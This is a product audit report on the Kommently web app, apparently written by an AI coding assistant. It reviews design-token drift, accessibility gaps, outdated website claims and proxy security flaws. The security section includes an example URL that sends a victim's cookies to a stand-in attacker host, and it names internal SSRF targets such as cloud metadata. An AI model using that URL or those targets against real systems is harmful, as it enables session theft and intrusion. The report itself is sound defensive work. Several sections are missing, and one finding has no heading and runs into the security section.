# Kommently — Product Audit Report

**Date:** 23 Nov 2026 · **Branch:** `claude_design` (HEAD `7b6afd6` + uncommitted `docker-compose.override.yml`) · **Status:** for review, nothing implemented

---

## 0. Scope, method and limits

**Covered:** all five apps (`server/`, `client/`, `admin/`, `website/`, `cloudflare-relay/`) plus `deploy/`, both compose files, `.env.example`, the design system (`kommently-design-system/`), `CLAUDE.md` and `TYPOGRAPHY-README.md` (used as the spec).

**Method:** a static review, reading the code line by line. Six parallel reviews covered:

- server security and infrastructure
- server business logic
- the core review experience and guest pages
- the app shell, its pages and the design system
- the admin panel
- the marketing website

The Critical and High items were then re-checked against the code by hand. Findings reported by more than one review were merged.

**Not done:**

- No running app.
- No browser or device testing.
- No load testing.
- No online CVE lookup; dependency versions were checked against what is installed.

Items marked **(Needs verification)** depend on runtime behaviour or deploy settings that could not be seen from the code.

**No files were changed** except this report.

### Severity scale
| Severity | Meaning |
|---|---|
| **Critical** | Exploitable security hole, or silent loss of customer data/privacy. Fix before the next release. |
| **High** | Broken core workflow, money/billing error, significant security or legal exposure, or an explicit product rule broken across a whole app. |
| **Medium** | Wrong behaviour in a secondary flow, notable UX/accessibility/performance gap, or a hardening gap. |
| **Low** | Polish, consistency, dead code, minor hardening. |

### Top 15: fix these first
1. **BUG-01** Saving the Share dialog silently removes the share-link password.
2. **SEC-01** `/api/proxy?guest=true` is an anonymous open web proxy for any URL, with no rate limit.
3. **SEC-02** The proxy forwards every API-origin cookie and the `Authorization` header to whatever URL it fetches.
4. **SEC-03** The base `docker-compose.yml` is unsafe by default (`PROXY_ALLOW_PRIVATE=true`, dev mode). Production safety depends on an override file that is fully commented out in your working copy.
5. **BUG-02** CORS doesn't allow `PUT`, so *Save billing details* and *Set workspace members* fail in production.
6. **FN-01** Billing, invoices and buyer tax details are visible to every role, guests included.
7. **FN-02** When a member deletes their own account, every project they created is deleted, and no password is asked.
8. **FN-04** Scheduling and then cancelling org deletion lifts payment-overdue and admin locks.
9. **FN-05** A locked, overdue org that buys its current plan gets two months for one payment.
10. **FN-06** Guest pins and comments never trigger email, Slack, Discord, Teams or Jira.
11. **UX-01** Keyboard focus outlines are removed across the app and the website (WCAG 2.4.7).
12. **SEC-04** Third-party screenshot services (`s0.wp.com/mshots`, `microlink.io`) receive every customer project URL.
13. **WEB-01** The website sells "Approvals", a feature removed in Nov 2026.
14. **SEC-05** Google Analytics loads and sends hits before cookie consent.
15. **ADM-01** Support agents receive superadmin-only data (MRR, invoices, deals, admin action log).

## 1. Theme & design system

### High

#### DS-01 · Coloured glows and gradients, which break the flat-colour rule
- **Where:**
  - Website:
    - `website/src/styles/kommently-site.css:2139-2150`: `.km-split-glow` is a brand-blue `radial-gradient` with `filter: blur(48px)`. It renders on the home page (`LandingPage.js:33,63`) and four product sections (`ProductPages.js:34,103,147,247`).
    - Coloured shadows: `rgba(0,61,255,.3)` at `LandingPage.js:77` and `ProductPages.js:117,261`, plus `kommently-site.css:2198,2231`.
  - Admin: `admin/src/pages/PaymentsPage.js:120` uses `bg-gradient-to-r`, with accents at lines 15 and 22.
  - Dead gradient utilities: `website/src/index.css:53-145` (`.text-gradient`, `.gradient-border`, `.section-shell`, `.premium-card`).
  - The OG image (`website/public/og-image.png`) uses a gradient wash.
- **Issue:** this breaks your standing rule (flat colours, no glows) and the design system.
- **Fix:**
  - Remove the `glow` prop and the `.km-split-glow` rule.
  - Use the neutral `--shadow-*` tokens only.
  - Replace the admin stripe with a flat brand colour.
  - Delete the legacy `index.css` utilities.
  - Regenerate the OG image flat.

### Medium

#### DS-02 · Token values drift between `tokens.json`, the CSS and Tailwind
- **Where:** `client/tailwind.config.js:2-14,92-98`; `client/src/styles/kommently.css:61-66,79-85`; `kommently-design-system/source/tokens.json`.
- **Issue:**
  - Radii: every radius, `--radius-pill` included, is 8px. The tokens and CLAUDE.md say 12px cards, 16px modals and 999px pills.
  - Brand scale: 50/100/400/500/700 differ from the tokens. For example, Tailwind brand-700 is `#0031d1` but the token is `#0031cc`, so `bg-blue-50` ≠ `var(--brand-50)`.
  - `--grid-card-min` is 290 (token 230) and `--radius-sm` is 8 (token 7).
  - Six tile hues aren't in the tokens. Tailwind maps `purple`/`teal`/`indigo` to brand blue, so the same workspace shows a different colour on the guest workspace page than on `kc-tile`.
  - The admin, client and website Tailwind palettes match each other, so the drift is design-system ↔ code.
- **Fix:** pick one source of truth and generate the CSS variables and the Tailwind theme from `tokens.json`. If the 8px radius was intentional (commit 93a08e2), update `tokens.json` and CLAUDE.md to match.

#### DS-03 · Web fonts: unused families, double loading, render-blocking
- **Where:**
  - `client/public/index.html:31`, `admin/public/index.html`, `website/public/index.html:22-27`.
  - `client/src/styles/kommently.css:1` (`@import`).
- **Issue:**
  - All three apps load Instrument Serif in 2 styles, but `USE_SERIF_HEADINGS=false` means it's never used.
  - Geist Mono is unused on the website and used only in `components/project` in the app.
  - Plus Jakarta 600 is unused; only 700 is used.
  - `kommently.css` `@import`s Inter and Plus Jakarta a second time, a chained, render-blocking request.
  - TYPOGRAPHY-README says "two families + mono, never 700", but the design system uses Plus Jakarta 700.
- **Fix:**
  - Load only Inter 400/500/600 and Plus Jakarta 700, with Geist Mono only where it's used.
  - Drop the `@import`.
  - Self-host with `preload`; this also fixes the privacy point in SEC-05.
  - Reconcile the README with the design system.

## 2. UI/UX & layout (incl. accessibility, content, SEO)

### High

#### UX-01 · Keyboard focus indicators are removed across the app and the website
- **Where:** `client/src/index.css:19-21` and `client/src/styles/kommently.css:163-166` (`:focus-visible, :focus { outline: none !important }`); `website/src/styles/kommently-site.css:130-132` (same rule under `.kc`). There are more `outline:none` rules on `.kc-pill`, `.kc-onb-*` and `.kc-notif .nr`.
- **Issue:** `!important` also overrides Tailwind's `focus-visible:` classes. Keyboard users can't see focus anywhere: rail, menus, CTAs, cookie banner, forms. This fails WCAG 2.4.7. `--focus-ring` is defined but never used.
- **Fix:** delete the blanket rules and add `.kc :focus-visible { outline: 2px solid var(--focus-ring); outline-offset: 2px }`, with `--focus-ring-on-dark` on dark surfaces.

#### UX-02 · Member project view on phones is broken and has no way back
- **Where:** `client/src/components/project/ProjectView.js:633,945-957`; `ReviewRail.js:19`; `kommently.css:2360` (`.kr { flex-direction: row }`).
- **Issue:** the mobile tab bar is the third child of a row flexbox, so it renders as a side strip instead of at the bottom. The rail (`hidden md:flex`) is the only way back to the dashboard, so users are stuck. CLAUDE.md says this view should only show a "works best on a larger screen" note.
- **Fix:** either show the note, as the spec says, or wrap the panes in `flex-col` with the nav last and add a back link in the header below `md`.

#### UX-03 · Opening a pin switches view-only users, guests and locked orgs into Comment mode
- **Where:** `client/src/components/project/ProjectView.js:308` (`handlePinNavigate → setPinMode(true)`), `:181-183`, `:222-248`, `:543-553`.
- **Issue:** view-only users, guests, locked orgs and anyone past the deadline see no pins on the canvas (`hidePins={!pinMode}`) until they open one from the list. Opening one turns on the crosshair, and their next click opens the composer, which fails with 403 or 423. The same call also clears the selected version, so the filter resets to "all".
- **Fix:** add a separate "show pins / focus" state, allow pin mode only when `canComment`, guard the click handlers, and don't clear the version on navigation.

#### WEB-01 · The website sells "Approvals", a feature that was removed
- **Where:**
  - Nav item "Approvals & status" (`website/src/components/site/index.js:33-37`).
  - The `/approvals` route and page (`App.js:66`, `ProductPages.js:133-184`) and "How approvals work" (`ProductPages.js:41-43`).
  - `CustomersPage.js:125`, `TermsPage.js:62`, and the `siteMetadata.json` keywords and description.
  - `website/src/styles/approvals.css` and `components/site/approvals.js`.
- **Issue:** client sign-off was removed in Nov 2026; only a manually set project status remains. This is a false claim on a sales page.
- **Fix:** rename to "Review status" (with a redirect from `/approvals`), rewrite the copy and keywords, and keep only the manual-status and deadline claims.

#### WEB-02 · Pages open scrolled down when you navigate (home, product pages, 404)
- **Where:** `website/src/App.js` has no ScrollToTop. Only About, Pricing, Support, Use cases and the legal pages call `scrollTo(0,0)`.
- **Issue:** clicking "Website review" in the footer or mega-menu lands mid-page, past the hero and the CTA, which costs conversions. Related: `/support#contact` never reaches the form (`SupportPage.js:43-45` always scrolls to the top; a router `<Link>` doesn't follow hashes).
- **Fix:** add one `ScrollToTop` in `App.js` that honours `location.hash`, and remove the per-page effects.

#### WEB-03 · The main CTA is hidden on phones and small tablets
- **Where:** `website/src/styles/kommently-site.css:2517-2520` (`.km-hide-sm` wraps "Start free trial", `site/index.js:490`).
- **Issue:** below 860px the CTA is only inside the hamburger menu. The design system says never to hide the primary CTA.
- **Fix:** keep a compact "Start free trial" button next to the menu button.

### Medium

#### UX-04 · Dialogs and drawers don't trap or restore focus
- **Where:**
  - `client/src/components/common/Modal.js` and the admin copy `admin/src/components/common/Modal.js:15-27`.
  - `AppLayout.js:274-306` + `kommently.css:2209-2225` (drawer), `SupportPanel.js:407`, `kc/index.js:847` (search palette).
  - Hand-built dialogs: `ShareProjectModal.js:111`, `NewPinCommentPopup.js:167`, `GuestProjectPage.js:388`, the screenshot lightbox `CommentSidebar.js:688-819` (no Escape, no `role="dialog"`), `CookiePreferencesModal.js:41-111` (website).
  - The admin `AdminSidebar.js:56-62` drawer.
- **Issue:**
  - Tab escapes into the page behind.
  - Closed drawers stay in the tab order, only moved off-screen with translateX.
  - A nested modal (Remove member inside Invite) closes both on one Escape.
  - Danger confirmations autofocus the destructive button, so Enter confirms (`admin ConfirmHost.js:30`).
- **Fix:**
  - Add one shared focus-trap hook.
  - Make closed drawers `inert`.
  - `stopPropagation` in the inner modal's Escape handler.
  - Autofocus Cancel on danger dialogs.
  - Move every hand-built dialog onto `Modal`.

#### UX-05 · Menus, selects, toggles and rows don't work by keyboard or screen reader
- **Where and issue:**
  - kc `Menu`/`MenuButton` (`kc/index.js:342-400`) and the website Product dropdown (`site/index.js:412-483`) use `role="menu"` with no arrow keys and don't move focus into the menu. Checked items have no `aria-checked`.
  - The website dropdown items are `<button>`s, not links: you can't open one in a new tab. On touch tablets, hover followed by click may toggle the menu shut **(Needs verification)**.
  - The kc `Select` blurs on every change (`kc/index.js:704-708`), so focus drops to `<body>` after each arrow-key press on Windows.
  - The admin list rows, a `<tr onClick>` in `DataTable.js:46-50`, can't be reached by keyboard. So can't guest pin rows (`GuestProjectPage.js:764`) or board cards (`TaskBoard.js:446`).
  - Admin toggles have no accessible name (`PricingPage.js:236-576`, `PaymentsPage.js:226`).
  - Icon buttons have no label: the guest back button (`GuestProjectPage.js:519`), the document prev/next buttons and select (`DocumentViewer.js:192,212,226`), and the Share close button (`ShareProjectModal.js:116`).
- **Fix:**
  - Use the disclosure pattern with `<Link>`s for navigation, and roving focus plus `menuitemradio`/`aria-checked` for menus.
  - Remove the `blur()`.
  - Render the primary cell as a link.
  - Add `aria-label`s.

- **Where:** `client/src/pages/OnboardingPage.js:31-41,839-895`; `client/src/components/settings/payments.js:8-18,42-77`.
- **Issue:** `loadScript` resolves when the `<script>` tag exists, not when it has loaded. ## 5. Security & performance (incl. infrastructure)

### Critical

#### SEC-01 · The guest proxy is an anonymous open web proxy
- **Where:** `server/controllers/proxy.controller.js:544-576` (verified), `:624`; `server/middleware/proxyAuth.js:23-27`; `server/app.js:108` (mounted before `globalLimiter`).
- **Issue:**
  - With `guest=true`, the only check is that *some* project has an active share link, and anyone can get one with a free trial.
  - `url=` is not tied to the project's site. Any method and up to 10 MB of body are relayed, with no rate limit.
- **Impact:**
  - Your server's IP can be used for scraping, spam and attack traffic.
  - Attacker-chosen HTML is served from `api.kommently.info`, which enables phishing on your domain. That script can also read the non-HttpOnly cookies other reviewed sites left there, including the `__markup_ls_*` token mirrors and `__markup_proxy_ctx`.
- **Fix:**
  - Allow only the project's own origin, plus assets whose Referer is a page of that origin.
  - Allow only GET and HEAD for guests.
  - Add per-IP and per-project rate limits on `/api/proxy`.
  - The structural fix is the separate sandbox domain already listed in Known issues.

### High

#### SEC-02 · The proxy forwards every reviewed site's cookies, and the Authorization header, to any target
- **Where:** `server/controllers/proxy.controller.js:388-395` (cookies re-scoped to `Path=/`), `:646-658` (verified).
- **Issue:** all API-host cookies except `markup_*`, HttpOnly session cookies included, plus `Authorization`, are sent to whatever `url=` is fetched. A reviewer logged in to a client's staging site who clicks `…/api/proxy?url=https://evil.example&projectId=<any shared>&guest=true` sends that staging session to the attacker. In normal use, site A's cookies leak to site B, and two sites with the same cookie name overwrite each other.
- **Fix:** namespace stored cookies per site (prefix with a host key when rewriting `Set-Cookie`), forward only the matching site's cookies, and never forward `Authorization` to another host.

#### SEC-03 · Production safety depends on an override file that is commented out locally
- **Where:** `docker-compose.yml:107-115` (`NODE_ENV=development`, `PROXY_ALLOW_PRIVATE: "true"`, dev servers, root containers); `docker-compose.override.yml` is fully commented in your uncommitted working copy (verified; HEAD is fine).
- **Issue:** CLAUDE.md does tell you to comment the override out for local work. But if that copy, or a `git pull` of a similar edit, reaches the server, production runs in dev mode with the SSRF guard off. Combined with SEC-01, anyone could then reach `mongo:27017`, `redis:6379` and cloud metadata at `169.254.169.254`.
- **Fix:** make the base file safe (no `PROXY_ALLOW_PRIVATE`), move dev mode into an explicit `docker-compose.dev.yml`, and make the server refuse to start with `PROXY_ALLOW_PRIVATE=true` when `API_URL` is https. **(Needs verification: what is deployed.)**

#### SEC-04 · Project URLs are sent to third-party screenshot services, and polled
- **Where:** `client/src/components/dashboard/ProjectCard.js:55-63` (verified); `client/src/components/kc/index.js:492-551`.
- **Issue:** every website card sends the customer's URL, often a private staging site, to Automattic (`s0.wp.com/mshots`) and Microlink. mshots is then polled up to 10 times every 2 seconds with `cache:'reload'`, so 40 cards make up to 400 requests. This contradicts CLAUDE.md ("no live iframe thumbnails") and the privacy policy's processor list.
- **Fix:** remove the external services. Use the wireframe, or a screenshot taken server-side through your own proxy.

#### SEC-05 · Google Analytics loads and sends hits before consent; fonts load from Google
- **Where:** `website/public/index.html:22-53`.
- **Issue:** `gtag.js` is always injected and `config` fires a page view while consent is "denied" (Consent Mode *advanced*: cookieless pings with IP and user agent). Google Fonts loads on first paint. Both are a GDPR/ePrivacy exposure for EU visitors.
- **Fix:** inject `gtag.js` and call `config` only after `writeCookieConsent` grants analytics, and self-host the fonts.

#### SEC-06 · No CSP or HSTS on any front end; long-lived tokens in localStorage
- **Where:** `deploy/nginx/kommently.conf:62-69,87-94,112-118`; `server/app.js:57` (CSP off); `admin/vercel.json` and `website/vercel.json` (no headers; stale, since deploys use nginx); `client/src/services/api.js:24` (7-day JWT); `admin/src/services/api.js:19-22` (12-hour superadmin token).
- **Issue:** any XSS, from a dependency, a CDN or a support widget, becomes a full account or superadmin takeover. The admin panel can be framed, so clickjacking on Lock, Refund or Remove admin is possible.
- **Fix:** set a strict CSP, `frame-ancestors 'none'`, HSTS, `Referrer-Policy`, `Permissions-Policy` and `nosniff` per host in nginx. Shorten the admin TTL. Delete the stale `vercel.json` files or bring them in line.

#### SEC-07 · Share-password hashes leak in the project list
- **Where:** `server/controllers/project.controller.js:211` (`...project.toObject()`; verified). The `toJSON` transform in `models/Project.js:96-106` doesn't apply to `toObject()`.
- **Issue:** every member who can see a project, view-only guests included, receives `shareSettings.passwordHash` and any legacy plaintext `password`, plus the share token.

## 8. Strengths worth keeping

- **Auth:**
  - JWT secret length is enforced and HS256 is pinned.
  - Tokens are separated by purpose: session, proxy, guest, unsubscribe, admin, 2FA challenge.
  - One session per user, rotated on logout and password change.
  - Login timing is equalised, and the OTP claim is atomic.
- **Admin 2FA:** TOTP with replay protection, hashed single-use recovery codes, AES-GCM secrets, and 2FA required by default. Every superadmin *mutation* is role-guarded on the server.
- **SSRF guard:** checked at connect time (defeats DNS rebinding) and on every redirect, and also applied to the integration webhooks.
- **Tenancy:** child records are scoped to their project. Cross-org access is refused.
- **Uploads:** mimetype-derived extensions, UUID names, `nosniff`, and sandboxed downloads for anything that isn't an image or PDF.
- **Payments:**
  - Razorpay HMAC with a timing-safe compare, and PayPal verify-signature.
  - Settlement is atomic and single-path, and refunds are de-duplicated.
  - Seat counting covers distinct pending invites.
- **Injection hygiene:** escaped regexes, CSV formula defusing, escaped email templates, and comment HTML sanitised on the server and again with DOMPurify. Logs and Sentry redact tokens.
- **Docker:** the production image runs non-root, the DB user is least-privileged, ports are bound to localhost, Redis has a password, and backups are encrypted.
- **Front end:**
  - Real-time de-duplication, screenshot-to-click routing via `clickId`, and lazy pages with the PDF rendered one page at a time.
  - Navigation state lives in the URL, and feedback goes through `toast` and `confirmDialog`.
